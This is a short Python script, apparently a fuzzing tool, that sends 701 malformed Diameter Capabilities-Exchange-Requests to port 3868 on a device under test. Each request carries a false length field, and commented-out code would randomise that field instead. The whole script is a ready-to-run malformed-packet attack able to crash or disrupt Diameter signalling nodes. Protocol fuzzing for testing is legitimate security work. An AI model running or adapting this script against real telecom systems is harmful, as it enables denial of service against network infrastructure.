#!/usr/bin/python
import socket
import os
import random
from random import randrange

dd=("\x01")
#dd=("\x01\x00\x00\xff") # manually test length values
#dd=("\x01\x00\x01\xb4") # valid version and length
req=("\x80\x00\x01\x01\x00\x00\x00\x00\x65\x96\x33\xc7\x00\x00\x00\x01\x00\x00\x01\x08\x40\x00\x00\x14\x31\x37\x32\x2e\x31\x39\x2e\x31\x37\x30\x2e\x32\x00\x00\x01\x28\x40\x00\x00\x0f\x61\x63\x6d\x65\x2e\x65\x73\x00\x00\x00\x01\x01\x40\x00\x00\x0e\x00\x01\x42\x42\x42\x42\x00\x00\x00\x00\x01\x0a\x40\x00\x00\x0c\x00\x00\x32\xdb\x00\x00\x01\x0d\x00\x00\x00\x22\x44\x69\x61\x6d\x65\x74\x65\x72\x20\x53\x65\x72\x76\x65\x72\x20\x54\x65\x73\x74\x20\x53\x75\x69\x74\x65\x00\x00\x00\x00\x01\x16\x40\x00\x00\x0c\x00\x01\x86\xa0\x00\x00\x01\x09\x40\x00\x00\x0c\x00\x00\x32\xdb\x00\x00\x01\x09\x40\x00\x00\x0c\x00\x00\x28\xaf\x00\x00\x01\x02\x40\x00\x00\x0c\x01\x00\x00\x23\x00\x00\x01\x03\x40\x00\x00\x0c\x00\x00\x00\x03\x00\x00\x01\x04\x40\x00\x00\x20\x00\x00\x01\x0a\x40\x00\x00\x0c\x00\x00\x28\xaf\x00\x00\x01\x02\x40\x00\x00\x0c\x01\x00\x00\x00\x00\x00\x01\x04\x40\x00\x00\x20\x00\x00\x01\x0a\x40\x00\x00\x0c\x00\x00\x28\xaf\x00\x00\x01\x02\x40\x00\x00\x0c\x01\x00\x00\x23\x00\x00\x01\x04\x40\x00\x00\x20\x00\x00\x01\x0a\x40\x00\x00\x0c\x00\x00\x28\xaf\x00\x00\x01\x02\x40\x00\x00\x0c\x01\x00\x00\x38\x00\x00\x01\x04\x40\x00\x00\x20\x00\x00\x01\x0a\x40\x00\x00\x0c\x00\x00\x28\xaf\x00\x00\x01\x02\x40\x00\x00\x0c\x01\x00\x00\x01\x00\x00\x01\x04\x40\x00\x00\x20\x00\x00\x01\x0a\x40\x00\x00\x0c\x00\x00\x28\xaf\x00\x00\x01\x02\x40\x00\x00\x0c\x01\x00\x00\x31\x00\x00\x01\x04\x40\x00\x00\x20\x00\x00\x01\x0a\x40\x00\x00\x0c\x00\x00\x28\xaf\x00\x00\x01\x02\x40\x00\x00\x0c\x01\x00\x00\x05\x00\x00\x01\x04\x40\x00\x00\x20\x00\x00\x01\x0a\x40\x00\x00\x0c\x00\x00\x28\xaf\x00\x00\x01\x02\x40\x00\x00\x0c\x01\x00\x00\x14\x00\x00\x01\x04\x40\x00\x00\x20\x00\x00\x01\x0a\x40\x00\x00\x0c\x00\x00\x28\xaf\x00\x00\x01\x02\x40\x00\x00\x0c\x01\x00\x00\x16")

def randombytes(data):
    s= chr(randrange(0,256))
    return s;

counter=0
while counter <= 700:
   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   #Change the IP in the s.connect to your device under test's Diameter interface
   s.connect(('172.19.170.10', 3868))
# This section used to send random bytes in len field
#   r1 = randombytes("a")
#   r2 = randombytes("b")
#   r3 = randombytes("c")
#   message = (dd, r1, r2, r3, req)
#   fuzz = "".join(message)
#   s.sendall(fuzz)

   message = (dd, "\x00\x00\xff", req)
   fuzz = "".join(message)
   s.sendall(fuzz)
   s.close()

   counter = counter + 1
